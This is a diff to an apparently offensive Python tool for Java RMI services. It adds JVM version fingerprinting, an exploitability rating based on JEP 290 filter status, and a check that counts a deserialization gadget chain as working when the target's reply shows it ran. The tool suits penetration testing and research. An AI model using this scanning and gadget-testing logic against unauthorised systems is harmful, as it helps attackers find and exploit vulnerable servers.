@@ -17,7 +17,7 @@ import struct
 from dataclasses import dataclass, field
 from typing import Any
 
-from javapwner.core.serialization import detect_exception_in_stream
+from javapwner.core.serialization import detect_exception_in_stream, infer_jdk_from_bytes
 from javapwner.core.socket_helper import TCPSession
 from javapwner.exceptions import ConnectionError
 from javapwner.protocols.rmi.protocol import (
@@ -62,6 +62,11 @@ class RmiScanResult:
     dgc_reachable: bool = False
     jep290_active: bool | None = None  # None = unknown
 
+    # JVM version inference
+    jvm_hint: str = "unknown"
+    # "jdk8u121-8u231" | "jdk8u232+" | "jdk8u232+-or-jdk9+" | "jdk8" | "jdk9+" | "unknown"
+    jvm_confidence: str = "none"  # "high" | "medium" | "none"
+
     # Lookup details (E.2)
     name_types: dict[str, str] = field(default_factory=dict)
     stub_endpoints: dict[str, dict] = field(default_factory=dict)
@@ -101,6 +106,9 @@ class RmiScanResult:
             "is_registry": self.is_registry,
             "bound_names": self.bound_names,
             "dgc_jep290": jep290_str,
+            "jvm_hint": self.jvm_hint,
+            "jvm_confidence": self.jvm_confidence,
+            "exploitability": self._exploitability(),
             "name_types": self.name_types,
             "stub_endpoints": self.stub_endpoints,
             "urldns_sent": self.urldns_sent,
@@ -109,6 +117,16 @@ class RmiScanResult:
             "gadgets_detection_skipped": self.gadgets_detection_skipped,
             "error": self.error,
         }
+
+    def _exploitability(self) -> str:
+        """Compute a single exploitability rating from scan state."""
+        if not self.dgc_reachable:
+            return "unknown"
+        if self.jep290_active is False:
+            return "critical" if self.gadgets_compatible else "high"
+        if self.jep290_active is True:
+            return "medium"  # filtered but bypass potentially viable
+        return "unknown"
 
 
 # ---------------------------------------------------------------------------
@@ -339,6 +357,14 @@ class RmiScanner:
                 elif "names" in parsed:
                     result.is_registry = True
                     result.bound_names = parsed.get("names", [])
+
+                # JVM version inference from Registry response (SUID-based, no filter needed)
+                hint, confidence = infer_jdk_from_bytes(raw)
+                if hint != "unknown" and (
+                    result.jvm_confidence == "none" or confidence == "high"
+                ):
+                    result.jvm_hint = hint
+                    result.jvm_confidence = confidence
         except ConnectionError:
             pass
 
@@ -452,7 +478,17 @@ class RmiScanner:
                     sess.send(build_client_endpoint())
                     sess.send(dgc_call)
                     response = sess.recv_all(timeout=_RECV_TIMEOUT)
+                    # A gadget is compatible if:
+                    # 1. No exception in the response (rare — gadget deserialized cleanly), OR
+                    # 2. An exception IS present but NOT a ClassNotFoundException/NoClassDefFoundError
+                    #    (meaning the gadget's classes were on the classpath and the chain
+                    #    executed; the exception is a normal post-execution throw, not a
+                    #    missing-class error or a JEP-290 filter rejection).
                     if not detect_exception_in_stream(response):
+                        compatible.append(gadget)
+                    elif (b"ClassNotFoundException" not in response
+                            and b"NoClassDefFoundError" not in response
+                            and b"filter status: REJECTED" not in response):
                         compatible.append(gadget)
             except ConnectionError:
                 continue
@@ -486,6 +522,12 @@ class RmiScanner:
                     result.jep290_active = True
                 else:
                     result.jep290_active = False
+
+                # JVM version inference from DGC response (most useful when JEP290 active)
+                hint, confidence = infer_jdk_from_bytes(response)
+                if hint != "unknown":
+                    result.jvm_hint = hint
+                    result.jvm_confidence = confidence
         except ConnectionError:
             pass
 
